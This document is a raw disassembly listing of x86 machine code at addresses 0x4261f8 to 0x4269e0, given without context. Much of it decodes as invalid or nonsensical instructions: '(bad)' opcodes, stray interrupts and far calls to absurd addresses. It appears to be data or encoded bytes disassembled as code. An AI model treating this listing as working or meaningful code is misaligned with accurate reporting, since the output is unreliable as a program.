  4261f8:	mov    BYTE PTR [eax],al
  4261fa:	(bad)  
  4261fb:	cmc    
  4261fc:	add    dh,dl
  4261fe:	adc    DWORD PTR [eax],eax
  426200:	(bad)  
  426201:	in     eax,dx
  426202:	jo     0x4261d3
  426204:	jbe    0x426203
  426206:	jo     0x4261c5
  426208:	stos   BYTE PTR es:[edi],al
  426209:	clc    
  42620a:	add    BYTE PTR [eax],al
  42620c:	or     dh,BYTE PTR [esi+0x1c]
  42620f:	int    0x76
  426211:	sbb    al,0xcd
  426213:	lea    esp,[edx+ecx*1]
  426216:	outs   dx,BYTE PTR ds:[esi]
  426217:	adc    al,0xcd
  426219:	jbe    0x42623f
  42621b:	leave  
  42621c:	add    BYTE PTR [edi-0x327f7f80],0x76
  426223:	lods   eax,DWORD PTR ds:[esi]
  426224:	int    0x8d
  426226:	and    al,0xa
  426228:	outs   dx,BYTE PTR ds:[esi]
  426229:	test   ch,cl
  42622b:	jbe    0x42625d
  42622d:	int    0x8d
  42622f:	and    al,0xa
  426231:	outs   dx,BYTE PTR ds:[esi]
  426232:	mov    ch,cl
  426234:	jbe    0x42624a
  426236:	int    0x8d
  426238:	and    al,0xa
  42623a:	outs   dx,BYTE PTR ds:[esi]
  42623b:	dec    esp
  42623c:	int    0x76
  42623e:	and    al,0xc9
  426240:	ins    BYTE PTR es:[edi],dx
  426241:	and    al,0x81
  426243:	add    BYTE PTR [eax-0x32e11380],0x76
  42624a:	sbb    al,0xcd
  42624c:	lea    ebx,[ecx*8-0x7f7ed2ff]
  426253:	or     ch,0xa
  426256:	and    eax,0xcd808081
  42625b:	xor    BYTE PTR [ebx],0x81
  42625e:	or     dh,BYTE PTR [esi-0x3]
  426261:	int    0x76
  426263:	std    
  426264:	stos   BYTE PTR es:[edi],al
  426265:	test   al,0x63
  426267:	retf   
  426268:	rcr    BYTE PTR [eax+eax*4],cl
  42626b:	xchg   esi,eax
  42626c:	int    0xed
  42626e:	int    0x76
  426270:	dec    esp
  426271:	adc    ch,ch
  426273:	cmp    eax,0x5b808081
  426278:	cwde   
  426279:	call   0x2f35:0x86214966
  426280:	push   es
  426281:	mov    ecx,0xcd80804a
  426286:	jbe    0x4262b8
  426288:	inc    cx
  42628a:	and    DWORD PTR [esi-0x62f9d0cb],eax
  426290:	dec    edx
  426291:	add    BYTE PTR [eax-0x29128937],0x37
  426298:	ficom  WORD PTR [ebx]
  42629a:	pop    ebp
  42629b:	mov    ebp,0xa25230a
  4262a0:	jbe    0x4262b3
  4262a2:	leave  
  4262a3:	jbe    0x42625a
  4262a5:	xchg   ecx,eax
  4262a6:	aaa    
  4262a7:	ficom  WORD PTR [ebx]
  4262a9:	or     dh,BYTE PTR [esi-0x43]
  4262ac:	int    0x76
  4262ae:	mov    BYTE PTR [edx],cl
  4262b0:	jbe    0x4262a7
  4262b2:	int    0x76
  4262b4:	cmc    
  4262b5:	int    0x1
  4262b7:	mov    ebp,0xcd808081
  4262bc:	or     ch,0x80
  4262bf:	or     dh,BYTE PTR [esi-0x7]
  4262c2:	pop    edi
  4262c3:	jle    0x4262fa
  4262c5:	add    BYTE PTR [eax-0x7fca69a3],0x80
  4262cc:	mov    eax,0x4b0760a
  4262d1:	ins    DWORD PTR es:[edi],dx
  4262d2:	(bad)  
  4262d3:	mov    eax,0xcda2760a
  4262d8:	sar    DWORD PTR [eax+0x5d15760a],cl
  4262de:	(bad)  
  4262df:	xor    eax,0xf1cd8080
  4262e4:	mov    eax,0xcf19960a
  4262e9:	nop
  4262ea:	xchg   edx,eax
  4262eb:	iret   
  4262ec:	sahf   
  4262ed:	(bad)  
  4262ee:	int    0x99
  4262f0:	mov    eax,0xcd1d960a
  4262f5:	aad    0xb8
  4262f7:	or     dl,BYTE PTR [esi-0x662dfbdf]
  4262fd:	mov    eax,0xcf01960a
  426302:	jno    0x426358
  426304:	int    0x3
  426306:	mov    eax,0x40be60a
  42630b:	leave  
  42630c:	xchg   ebp,eax
  42630d:	mov    eax,0xcf05e60a
  426312:	ficomp WORD PTR [eax-0x48]
  426315:	or     ah,dh
  426317:	pop    es
  426318:	mov    eax,0xb809760a
  42631d:	or     dl,dh
  42631f:	retf   0xc5cd
  426322:	mov    eax,0xb8cc760a
  426327:	or     dl,BYTE PTR [edi]
  426329:	ins    BYTE PTR es:[edi],dx
  42632a:	add    BYTE PTR [eax],al
  42632c:	add    BYTE PTR [ebp*2+0x60ab8d0],al
  426333:	push   edx
  426334:	add    BYTE PTR [eax],al
  426336:	add    bh,cl
  426338:	outs   dx,BYTE PTR ds:[esi]
  426339:	add    edi,DWORD PTR [eax+0x74060a]
  42633f:	add    BYTE PTR [eax],al
  426341:	add    al,0x6d
  426343:	inc    edx
  426344:	mov    eax,0x78060a
  426349:	add    BYTE PTR [eax],al
  42634b:	iret   
  42634c:	outs   dx,BYTE PTR ds:[esi]
  42634d:	xor    BYTE PTR [eax+0x7c060a],bh
  426353:	add    BYTE PTR [eax],al
  426355:	add    al,0x6d
  426357:	xor    bh,BYTE PTR [eax+0x8a060a]
  42635d:	add    BYTE PTR [eax],al
  42635f:	mov    eax,0x8ccf0a
  426364:	add    BYTE PTR [eax],al
  426366:	int    0xc5
  426368:	mov    eax,0x8e060a
  42636d:	add    BYTE PTR [eax],al
  42636f:	int    0x76
  426371:	in     eax,dx
  426372:	int    0x8d
  426374:	adc    DWORD PTR [edi],ebp
  426376:	inc    ebp
  426377:	jge    0x42630b
  426379:	shr    ebx,cl
  42637b:	xchg   edx,eax
  42637c:	int    0x8d
  42637e:	in     eax,dx
  42637f:	int    0x96
  426381:	adc    ebx,eax
  426383:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426384:	mov    esi,0xc93b4229
  426389:	cmp    ebx,edx
  42638b:	shl    edx,cl
  42638d:	sub    BYTE PTR [ebx-0x2e],dl
  426390:	in     al,dx
  426391:	outs   dx,BYTE PTR ds:[esi]
  426392:	iret   
  426393:	aam    0x76
  426395:	mov    al,0xb8
  426397:	int    0x4e
  426399:	das    
  42639a:	mov    ebx,0xcbbb2f18
  42639f:	cmp    ecx,DWORD PTR [edx+edx*1]
  4263a2:	sti    
  4263a3:	and    DWORD PTR ds:0xf3e38080,esi
  4263a9:	shl    edx,cl
  4263ab:	das    
  4263ac:	push   ebx
  4263ad:	adc    ecx,DWORD PTR [ecx]
  4263af:	int3   
  4263b0:	test   DWORD PTR [ebp-0x32ffff01],esp
  4263b6:	lea    esi,[ebp+0x2fbd96cd]
  4263bc:	inc    ebp
  4263bd:	jecxz  0x426351
  4263bf:	shl    ebx,cl
  4263c1:	xchg   edx,eax
  4263c2:	int    0x96
  4263c4:	mov    ch,0xcd
  4263c6:	(bad)  
  4263c7:	mov    ebp,0xf73bf03b
  4263cc:	push   ebx
  4263cd:	psrlq  mm5,mm2
  4263d0:	sub    BYTE PTR [edi-0x7906fb2d],al
  4263d6:	(bad)  
  4263d7:	popa   
  4263d8:	int    0x76
  4263da:	in     eax,dx
  4263db:	int    0x8d
  4263dd:	adc    DWORD PTR [edi],ebp
  4263df:	inc    ebp
  4263e0:	jge    0x426374
  4263e2:	shr    ebx,cl
  4263e4:	xchg   edx,eax
  4263e5:	int    0x8d
  4263e7:	in     eax,dx
  4263e8:	int    0x96
  4263ea:	adc    DWORD PTR [ebx],edi
  4263ec:	leave  
  4263ed:	cmp    ebx,edx
  4263ef:	shl    edx,cl
  4263f1:	sub    BYTE PTR [ebx-0x2e],dl
  4263f4:	in     al,dx
  4263f5:	outs   dx,BYTE PTR ds:[esi]
  4263f6:	iret   
  4263f7:	aam    0x76
  4263f9:	add    DWORD PTR [eax-0x44d0b133],edi
  4263ff:	sbb    BYTE PTR [edi],ch
  426401:	mov    ebx,0x120c3bcb
  426406:	sti    
  426407:	and    DWORD PTR ds:0xf3e38080,esi
  42640d:	shl    edx,cl
  42640f:	das    
  426410:	push   ebx
  426411:	adc    ecx,DWORD PTR [ecx]
  426413:	int3   
  426414:	test   esp,ecx
  426416:	inc    DWORD PTR [eax]
  426418:	add    ch,cl
  42641a:	lea    esi,[ebp+0x2fbd96cd]
  426420:	inc    ebp
  426421:	jecxz  0x4263b5
  426423:	shl    ebx,cl
  426425:	xchg   edx,eax
  426426:	int    0x96
  426428:	mov    ch,0xcd
  42642a:	(bad)  
  42642b:	mov    ebp,0xf73bf03b
  426430:	push   ebx
  426431:	psrlq  mm5,mm2
  426434:	sub    BYTE PTR [edi-0x7406fb2d],al
  42643a:	(bad)  
  42643b:	popa   
  42643c:	int    0x76
  42643e:	in     eax,dx
  42643f:	int    0x8d
  426441:	adc    DWORD PTR [edi],ebp
  426443:	inc    ebp
  426444:	jge    0x4263d8
  426446:	shr    ebx,cl
  426448:	xchg   edx,eax
  426449:	int    0x8d
  42644b:	in     eax,dx
  42644c:	int    0x96
  42644e:	adc    DWORD PTR [ebx],edi
  426450:	leave  
  426451:	cmp    ebx,edx
  426453:	shl    edx,cl
  426455:	sub    BYTE PTR [ebx-0x2e],dl
  426458:	in     al,dx
  426459:	je     0x42642a
  42645b:	push   ebp
  42645c:	jbe    0x4264ca
  42645e:	add    BYTE PTR [eax],al
  426460:	add    BYTE PTR [eax-0x44d0b133],bh
  426466:	sbb    BYTE PTR [edi],ch
  426468:	mov    ebx,0x120c3bcb
  42646d:	sti    
  42646e:	and    DWORD PTR ds:0xf3e38080,esi
  426474:	shl    edx,cl
  426476:	das    
  426477:	push   ebx
  426478:	adc    ecx,DWORD PTR [ecx]
  42647a:	int3   
  42647b:	test   DWORD PTR ds:0xcd0000ff,eax
  426481:	lea    esi,[ebp+0x2fbd96cd]
  426487:	inc    ebp
  426488:	jecxz  0x42641c
  42648a:	shl    ebx,cl
  42648c:	xchg   edx,eax
  42648d:	int    0x96
  42648f:	mov    ch,0xcd
  426491:	(bad)  
  426492:	mov    ebp,0xf73bf03b
  426497:	push   ebx
  426498:	psrlq  mm5,mm2
  42649b:	sub    BYTE PTR [edi-0x7706fb2d],al
  4264a1:	(bad)  
  4264a2:	mov    ebx,0xffb506cf
  4264a7:	add    BYTE PTR [eax],al
  4264a9:	or     dh,BYTE PTR [esi-0x7]
  4264ac:	int    0x76
  4264ae:	stc    
  4264af:	pop    edi
  4264b0:	inc    esi
  4264b1:	pop    esp
  4264b2:	inc    ebp
  4264b3:	xchg   edi,eax
  4264b4:	or     cl,BYTE PTR [eax+0x79245161]
  4264ba:	daa    
  4264bb:	or     dh,BYTE PTR [eax-0x7c]
  4264be:	int    0x6
  4264c0:	mov    ch,0xff
  4264c2:	add    BYTE PTR [eax],al
  4264c4:	int    0x57
  4264c6:	mov    ebp,0xa0000ff
  4264cb:	(bad)  
  4264cc:	mov    ebp,0x8621d169
  4264d1:	xor    eax,0x62fd343
  4264d6:	pusha  
  4264d7:	add    DWORD PTR [eax-0x4269a180],0x8151062f
  4264e1:	add    BYTE PTR [eax-0x7fca76a3],0x80
  4264e8:	mov    eax,0xfff9060a
  4264ed:	add    BYTE PTR [eax],al
  4264ef:	int    0xc5
  4264f1:	mov    eax,0xff03060a
  4264f6:	add    BYTE PTR [eax],al
  4264f8:	pop    ebp
  4264f9:	es xor eax,0xab88080
  4264ff:	push   es
  426500:	std    
  426501:	inc    DWORD PTR [eax]
  426503:	add    BYTE PTR [ebp-0x5d],bl
  426506:	xor    eax,0xab88080
  42650b:	push   es
  42650c:	(bad)  
  42650d:	inc    DWORD PTR [eax]
  42650f:	add    BYTE PTR [ebp+0x1e],bl
  426512:	xor    eax,0xab88080
  426517:	push   es
  426518:	add    BYTE PTR [eax],0x0
  42651b:	add    BYTE PTR [ebp*2-0x47823218],al
  426522:	or     cl,bh
  426524:	xchg   edx,eax
  426525:	add    BYTE PTR [eax],al
  426527:	add    ch,cl
  426529:	jbe    0x42655b
  42652b:	pop    edi
  42652c:	dec    ebx
  42652d:	xor    eax,0xab88080
  426532:	iret   
  426533:	test   BYTE PTR [eax],al
  426535:	add    BYTE PTR [eax],al
  426537:	add    al,0xd3
  426539:	bound  edi,QWORD PTR [eax+0x86cf0a]
  42653f:	add    BYTE PTR [eax],al
  426541:	pop    edi
  426542:	push   esi
  426543:	xor    eax,0xab88080
  426548:	iret   
  426549:	mov    BYTE PTR [eax],al
  42654b:	add    BYTE PTR [eax],al
  42654d:	add    al,0xd3
  42654f:	pushf  
  426550:	mov    eax,0x4acf0a
  426555:	add    BYTE PTR [eax],al
  426557:	int    0xc
  426559:	mov    eax,0x4ccf0a
  42655e:	add    BYTE PTR [eax],al
  426560:	pop    edi
  426561:	add    al,0x35
  426563:	add    BYTE PTR [eax+0x4ecf0ab8],0x0
  42656a:	add    BYTE PTR [eax],al
  42656c:	cmp    edi,DWORD PTR [ecx+0x5f]
  42656f:	adc    DWORD PTR [eax-0x80],edx
  426572:	cmp    BYTE PTR [eax+0x30cf0a],0x0
  426579:	add    bl,dl
  42657b:	mov    ebp,0x151a5f92
  426580:	add    BYTE PTR [eax+0x22cf0ab8],0x0
  426587:	add    BYTE PTR [eax],al
  426589:	pop    edi
  42658a:	call   0xcf0a:0xb88080eb
  426591:	adc    al,0x0
  426593:	add    BYTE PTR [eax],al
  426595:	int    0x8d
  426597:	xor    BYTE PTR [edx+eax*1],al
  42659a:	call   ebx
  42659c:	repnz sub BYTE PTR [ebx-0x2d],dl
  4265a0:	or     al,BYTE PTR [esi]
  4265a2:	adc    eax,0xcd0000ff
  4265a7:	jbe    0x4265f5
  4265a9:	int    0x8d
  4265ab:	dec    esp
  4265ac:	cmp    edi,DWORD PTR [ecx-0x2d]
  4265af:	mov    ebp,0xff020492
  4265b4:	shl    edx,cl
  4265b6:	sub    BYTE PTR [ebx-0x2d],dl
  4265b9:	leave  
  4265ba:	add    eax,0xff1d06
  4265bf:	add    BYTE PTR [eax],al
  4265c1:	add    BYTE PTR [eax+0x1506cf80],al
  4265c7:	inc    DWORD PTR [eax]
  4265c9:	add    BYTE PTR [eax-0x33],dh
  4265cc:	jbe    0x4265fe
  4265ce:	int    0x8d
  4265d0:	xor    BYTE PTR [ebx],bh
  4265d2:	jns    0x4265a7
  4265d4:	mov    ebp,0xff020492
  4265d9:	shl    edx,cl
  4265db:	sub    BYTE PTR [ebx-0x2d],dl
  4265de:	jo     0x4265af
  4265e0:	push   es
  4265e1:	stc    
  4265e2:	inc    DWORD PTR [eax]
  4265e4:	add    BYTE PTR [eax-0x33],dh
  4265e7:	jbe    0x4265de
  4265e9:	int    0x1
  4265eb:	cmp    eax,0xc9808081
  4265f0:	push   es
  4265f1:	sbb    BYTE PTR [eax],al
  4265f3:	add    BYTE PTR [eax],al
  4265f5:	inc    eax
  4265f6:	retf   
  4265f7:	fwait
  4265f8:	xor    eax,0x76cd5000
  4265fd:	adc    al,0x0
  4265ff:	icebp  
  426600:	or     dh,BYTE PTR [esi-0x7]
  426603:	int    0x76
  426605:	stc    
  426606:	push   es
  426607:	ins    DWORD PTR es:[edi],dx
  426608:	aam    0x4a
  42660a:	adc    dl,BYTE PTR [esi+0x68]
  42660d:	or     BYTE PTR [ebx+ecx*1],bl
  426610:	fmul   QWORD PTR [ebx-0x17]
  426613:	(bad)  
  426614:	int    0x8d
  426616:	dec    esp
  426617:	int    0x96
  426619:	dec    esp
  42661a:	sar    bh,0x3b
  42661d:	setl   BYTE PTR [ebx]
  426620:	icebp  
  426621:	shr    edx,cl
  426623:	sub    bl,dl
  426625:	jmp    0x4265b9
  426627:	push   ebx
  426628:	adc    ecx,ebp
  42662a:	xchg   esi,eax
  42662b:	cmc    
  42662c:	int    0xa2
  42662e:	and    eax,0x5e808081
  426633:	dec    edx
  426634:	das    
  426635:	push   es
  426636:	popa   
  426637:	test   DWORD PTR [eax+0x4c8dcd80],eax
  42663d:	int    0x96
  42663f:	dec    esp
  426640:	cmp    ecx,DWORD PTR [edi]
  426642:	shr    ebx,cl
  426644:	xchg   edx,eax
  426645:	cmp    esi,ecx
  426647:	shr    edx,cl
  426649:	sub    BYTE PTR [ebx+0x13],dl
  42664c:	int    0x96
  42664e:	cmc    
  42664f:	int    0xa2
  426651:	in     al,0x81
  426653:	add    BYTE PTR [eax-0x7232b5f6],0x4c
  42665a:	int    0x96
  42665c:	dec    esp
  42665d:	cmp    ecx,DWORD PTR [edi]
  42665f:	shr    ebx,cl
  426661:	xchg   edx,eax
  426662:	cmp    esi,ecx
  426664:	shr    edx,cl
  426666:	sub    BYTE PTR [ebx+0x13],dl
  426669:	int    0x96
  42666b:	cmc    
  42666c:	int    0xa2
  42666e:	add    DWORD PTR [ecx+0x4a0a8080],eax
  426674:	pop    edi
  426675:	xor    ax,0x8080
  426679:	mov    eax,0x24cf0a
  42667e:	add    BYTE PTR [eax],al
  426680:	int    0xc
  426682:	mov    eax,0x28cf0a
  426687:	add    BYTE PTR [eax],al
  426689:	pop    edi
  42668a:	es xor eax,0xab88080
  426690:	iret   
  426691:	sub    al,0x0
  426693:	add    BYTE PTR [eax],al
  426695:	pop    edi
  426696:	daa    
  426697:	xor    eax,0xab88080
  42669c:	iret   
  42669d:	xor    al,BYTE PTR [eax]
  42669f:	add    BYTE PTR [eax],al
  4266a1:	add    al,0xd3
  4266a3:	test   eax,0x34cf0ab8
  4266a8:	add    BYTE PTR [eax],al
  4266aa:	add    BYTE PTR [edi-0x69],bl
  4266ad:	xor    eax,0xab88080
  4266b2:	iret   
  4266b3:	cmp    BYTE PTR [eax],al
  4266b5:	add    BYTE PTR [eax],al
  4266b7:	add    al,0xd3
  4266b9:	mov    dl,0xb8
  4266bb:	or     cl,bh
  4266bd:	cmp    al,0x0
  4266bf:	add    BYTE PTR [eax],al
  4266c1:	pop    edi
  4266c2:	fwait
  4266c3:	xor    eax,0xab88080
  4266c8:	iret   
  4266c9:	inc    eax
  4266ca:	add    BYTE PTR [eax],al
  4266cc:	add    ch,cl
  4266ce:	or     al,0xb8
  4266d0:	or     cl,bh
  4266d2:	inc    esp
  4266d3:	add    BYTE PTR [eax],al
  4266d5:	add    BYTE PTR [edi+0x17],bl
  4266d8:	xor    eax,0xab88080
  4266dd:	iret   
  4266de:	dec    eax
  4266df:	add    BYTE PTR [eax],al
  4266e1:	add    BYTE PTR [edi+0x26],bl
  4266e4:	pop    esi
  4266e5:	add    BYTE PTR [eax+0x50cf0ab8],0x0
  4266ec:	add    BYTE PTR [eax],al
  4266ee:	pop    edi
  4266ef:	cmp    esi,DWORD PTR [edx]
  4266f1:	add    BYTE PTR [eax+0x42cf0ab8],0x0
  4266f8:	add    BYTE PTR [eax],al
  4266fa:	jns    0x426772
  4266fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4266fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266fe:	pop    edi
  4266ff:	pop    esp
  426700:	adc    eax,0xab88080
  426705:	iret   
  426706:	push   esp
  426707:	add    BYTE PTR [eax],al
  426709:	add    BYTE PTR [ebx+edx*8],al
  42670c:	pop    esp
  42670d:	mov    eax,0x58cf0a
  426712:	add    BYTE PTR [eax],al
  426714:	jns    0x42678c
  426716:	fisttp WORD PTR [ecx+0x79]
  426719:	jbe    0x4266c4
  42671b:	inc    ecx
  42671c:	jns    0x426794
  42671e:	loope  0x4266c3
  426720:	pop    edi
  426721:	fcom   st(4)
  426723:	add    BYTE PTR [eax+0x5ccf0ab8],0x0
  42672a:	add    BYTE PTR [eax],al
  42672c:	jns    0x4267a4
  42672e:	lods   eax,DWORD PTR ds:[esi]
  42672f:	push   edi
  426730:	pop    edi
  426731:	jnp    0x426788
  426733:	add    BYTE PTR [eax+0x60cf0ab8],0x0
  42673a:	add    BYTE PTR [eax],al
  42673c:	jns    0x4267b4
  42673e:	repnz cmp DWORD PTR [ecx+0x76],edi
  426742:	jmp    0x8080:0x35a15f47
  426749:	mov    eax,0x64cf0a
  42674e:	add    BYTE PTR [eax],al
  426750:	jns    0x4267c8
  426752:	in     eax,0x18
  426754:	int    0x8d
  426756:	xor    ch,cl
  426758:	xchg   esi,eax
  426759:	xor    BYTE PTR [ebx],bh
  42675b:	(bad)  
  42675d:	icebp  
  42675e:	shr    ebx,cl
  426760:	xchg   edx,eax
  426761:	shr    edx,cl
  426763:	sub    BYTE PTR [ebx+0x13],dl
  426766:	in     al,dx
  426767:	xchg   esp,eax
  426768:	int    0x96
  42676a:	xor    ch,cl
  42676c:	out    0x30,al
  42676e:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  426774:	stc    
  426775:	shr    ecx,cl
  426777:	sub    BYTE PTR [ebx-0x27],dl
  42677a:	xor    edx,DWORD PTR [ebx]
  42677c:	das    
  42677d:	pop    ecx
  42677e:	mov    WORD PTR [ebp-0x5b],cs
  426781:	int    0x96
  426783:	xor    ch,cl
  426785:	out    0x30,al
  426787:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42678d:	stc    
  42678e:	shr    ecx,cl
  426790:	sub    BYTE PTR [ebx-0x27],dl
  426793:	int    0xe6
  426795:	stc    
  426796:	add    al,0x2
  426798:	adc    DWORD PTR [edx],0xffffffd3
  42679b:	fwait
  42679c:	add    BYTE PTR [eax+0x9033380],0x8c
  4267a3:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  4267a5:	int    0x96
  4267a7:	xor    ch,cl
  4267a9:	lea    esi,[eax]
  4267ab:	cmp    ebx,DWORD PTR [ecx-0xd2c82c5]
  4267b1:	sub    bl,dl
  4267b3:	repz xchg edx,eax
  4267b5:	push   ebx
  4267b6:	jecxz  0x426785
  4267b8:	(bad)  
  4267b9:	stc    
  4267ba:	xchg   DWORD PTR [ebx],edx
  4267bc:	int    0x96
  4267be:	xor    ch,cl
  4267c0:	out    0x30,al
  4267c2:	cmp    ebx,DWORD PTR [ecx-0xc2c06c5]
  4267c8:	xchg   edx,eax
  4267c9:	shr    ecx,cl
  4267cb:	sub    BYTE PTR [ebx-0x27],dl
  4267ce:	add    al,0xd2
  4267d0:	mov    BYTE PTR [edx],cl
  4267d2:	(bad)  
  4267d3:	stc    
  4267d4:	inc    ebx
  4267d5:	adc    eax,DWORD PTR [edx+0x308dcdb0]
  4267db:	int    0x96
  4267dd:	xor    BYTE PTR [ebx],bh
  4267df:	(bad)  
  4267e1:	icebp  
  4267e2:	shr    ebx,cl
  4267e4:	xchg   edx,eax
  4267e5:	shr    edx,cl
  4267e7:	sub    BYTE PTR [ebx+0x13],dl
  4267ea:	or     cl,bh
  4267ec:	adc    eax,0xcd0000ff
  4267f1:	lea    ecx,[ebp+ecx*8-0x6a]
  4267f5:	dec    esp
  4267f6:	cmp    ecx,DWORD PTR [edi]
  4267f8:	cmp    esi,ecx
  4267fa:	shr    edx,cl
  4267fc:	sub    bl,dl
  4267fe:	jmp    0x426792
  426800:	push   ebx
  426801:	adc    ecx,edi
  426803:	xchg   esi,eax
  426804:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426805:	or     dl,BYTE PTR ds:0xff1dcf
  42680b:	add    BYTE PTR [ecx+0x6b],ah
  42680e:	xor    eax,0x13cd8080
  426813:	mov    eax,0x4258d0a
  426818:	rcl    edx,cl
  42681a:	int    0xfa
  42681c:	mov    eax,0xcf29e60a
  426821:	loopne 0x4267cc
  426823:	mov    eax,0x42de60a
  426828:	leave  
  426829:	test   BYTE PTR [eax-0x304d19f6],bh
  42682f:	loopne 0x426845
  426831:	mov    eax,0x435e60a
  426836:	leave  
  426837:	loop   0x4267f1
  426839:	or     ah,dh
  42683b:	cmp    ebp,ecx
  42683d:	cli    
  42683e:	mov    eax,0xcd3de60a
  426843:	add    edi,DWORD PTR [eax-0x32be19f6]
  426849:	cld    
  42684a:	mov    eax,0xcd45e60a
  42684f:	add    edi,DWORD PTR [eax-0x322f19f6]
  426855:	cli    
  426856:	mov    eax,0xcfc2e60a
  42685b:	loopne 0x426886
  42685d:	mov    eax,0x455e60a
  426862:	leave  
  426863:	test   BYTE PTR [eax-0x30a619f6],bh
  426869:	loopne 0x426800
  42686b:	mov    eax,0x45de60a
  426870:	leave  
  426871:	loop   0x42682b
  426873:	or     ah,dh
  426875:	popa   
  426876:	mov    eax,0xb8658d0a
  42687b:	or     dl,BYTE PTR [esi-0x47f33297]
  426881:	or     cl,BYTE PTR [ebp+0x4c8dcd6d]
  426887:	int    0x96
  426889:	dec    esp
  42688a:	cmp    esi,ecx
  42688c:	cmp    ecx,DWORD PTR [edi]
  42688e:	shr    edx,cl
  426890:	sub    bl,dl
  426892:	jmp    0x426826
  426894:	push   ebx
  426895:	adc    ecx,ebp
  426897:	xchg   esi,eax
  426898:	dec    esp
  426899:	int    0xe6
  42689b:	dec    esp
  42689c:	cmp    ebx,DWORD PTR [ecx-0x306d0c2d]
  4268a2:	mov    WORD PTR [ebp-0x2c06c430],cs
  4268a8:	jmp    0x301bbbd5
  4268ad:	mov    ebx,0xb8d93b5e
  4268b2:	or     dh,BYTE PTR [ecx]
  4268b4:	int    0x8d
  4268b6:	dec    esp
  4268b7:	int    0x96
  4268b9:	dec    esp
  4268ba:	cmp    ecx,DWORD PTR [edi]
  4268bc:	cmp    esi,ecx
  4268be:	shr    ebx,cl
  4268c0:	xchg   edx,eax
  4268c1:	shr    edx,cl
  4268c3:	sub    BYTE PTR [ebx+0x13],dl
  4268c6:	int    0x96
  4268c8:	dec    esp
  4268c9:	iret   
  4268ca:	mov    WORD PTR [ebp-0x3266c4db],cs
  4268d0:	out    0x4c,al
  4268d2:	shl    ebx,cl
  4268d4:	xchg   edx,eax
  4268d5:	cmp    edi,ecx
  4268d7:	shr    ecx,cl
  4268d9:	sub    BYTE PTR [ebx-0x27],dl
  4268dc:	das    
  4268dd:	mov    ebx,0xb8d93b5e
  4268e2:	or     dh,BYTE PTR [ecx]
  4268e4:	int    0x8d
  4268e6:	dec    esp
  4268e7:	int    0x96
  4268e9:	dec    esp
  4268ea:	cmp    esi,ecx
  4268ec:	shr    edx,cl
  4268ee:	sub    BYTE PTR [ebx],bh
  4268f0:	psrlq  mm5,mm3
  4268f3:	xchg   edx,eax
  4268f4:	push   ebx
  4268f5:	adc    ecx,ebp
  4268f7:	xchg   esi,eax
  4268f8:	dec    esp
  4268f9:	int    0xe6
  4268fb:	dec    esp
  4268fc:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  426902:	stc    
  426903:	shr    ecx,cl
  426905:	sub    BYTE PTR [ebx-0x27],dl
  426908:	mov    eax,0x9096cc0a
  42690d:	inc    DWORD PTR [eax]
  42690f:	add    ch,cl
  426911:	lea    ecx,[ebp+ecx*8-0x6a]
  426915:	dec    esp
  426916:	cmp    esi,ecx
  426918:	shr    edx,cl
  42691a:	sub    BYTE PTR [ebx],bh
  42691c:	psrlq  mm5,mm3
  42691f:	xchg   edx,eax
  426920:	push   ebx
  426921:	adc    ecx,ebp
  426923:	xchg   esi,eax
  426924:	dec    esp
  426925:	int    0xe6
  426927:	dec    esp
  426928:	cmp    ebx,DWORD PTR [ecx+0x3b92f3d3]
  42692e:	stc    
  42692f:	shr    ecx,cl
  426931:	sub    BYTE PTR [ebx-0x27],dl
  426934:	mov    eax,0xa496cc0a
  426939:	inc    DWORD PTR [eax]
  42693b:	add    ch,cl
  42693d:	lea    esi,[eax]
  42693f:	int    0x96
  426941:	xor    BYTE PTR [ebx],bh
  426943:	icebp  
  426944:	cmp    ecx,DWORD PTR [edi]
  426946:	shr    edx,cl
  426948:	sub    bl,dl
  42694a:	jmp    0x4268de
  42694c:	push   ebx
  42694d:	adc    ecx,ebp
  42694f:	xchg   esi,eax
  426950:	xor    ch,cl
  426952:	out    0x30,al
  426954:	cmp    ebx,DWORD PTR [ecx-0xc2c06c5]
  42695a:	xchg   edx,eax
  42695b:	shr    ecx,cl
  42695d:	sub    BYTE PTR [ebx-0x27],dl
  426960:	xchg   DWORD PTR [ebx],edx
  426962:	or     cl,bh
  426964:	adc    eax,0xcd0000ff
  426969:	lea    ecx,[ebp+ecx*8-0x6a]
  42696d:	dec    esp
  42696e:	int    0xe6
  426970:	mov    BYTE PTR [ebx],bh
  426972:	icebp  
  426973:	cmp    ecx,DWORD PTR [edi]
  426975:	shr    ebx,cl
  426977:	xchg   edx,eax
  426978:	shr    edx,cl
  42697a:	sub    BYTE PTR [ebx+0x13],dl
  42697d:	iret   
  42697e:	push   es
  42697f:	nop
  426980:	inc    DWORD PTR [eax]
  426982:	add    BYTE PTR [edx],cl
  426984:	add    eax,0xff1dcf
  426989:	add    bh,cl
  42698b:	jbe    0x42695d
  42698d:	mov    ebp,0x10d8
  426992:	int    0x8d
  426994:	xor    ch,cl
  426996:	xchg   esi,eax
  426997:	xor    al,al
  426999:	(bad)  
  42699a:	cmp    ecx,DWORD PTR [edi]
  42699c:	stos   BYTE PTR es:[edi],al
  42699d:	cmp    ebx,ecx
  42699f:	shr    ebx,cl
  4269a1:	xchg   edx,eax
  4269a2:	shr    edx,cl
  4269a4:	sub    BYTE PTR [ebx+0x13],dl
  4269a7:	or     al,BYTE PTR ds:0xff1dcf
  4269ad:	add    ch,cl
  4269af:	jbe    0x4269fd
  4269b1:	int    0x8d
  4269b3:	dec    esp
  4269b4:	cmp    edi,DWORD PTR [ecx-0x2d]
  4269b7:	mov    ebp,0xd3f03b92
  4269bc:	repnz sub BYTE PTR [ebx-0x2d],dl
  4269c0:	aam    0x3c
  4269c2:	iret   
  4269c3:	push   es
  4269c4:	adc    eax,0x700000ff
  4269c9:	int    0x76
  4269cb:	xor    ch,cl
  4269cd:	lea    esi,[eax]
  4269cf:	cmp    edi,DWORD PTR [ecx-0x2d]
  4269d2:	mov    ebp,0xd3f03b92
  4269d7:	repnz sub BYTE PTR [ebx-0x2d],dl
  4269db:	jo     0x4269ac
  4269dd:	push   es
  4269de:	and    al,0x0
  4269e0:	add    BYTE PTR [eax],al
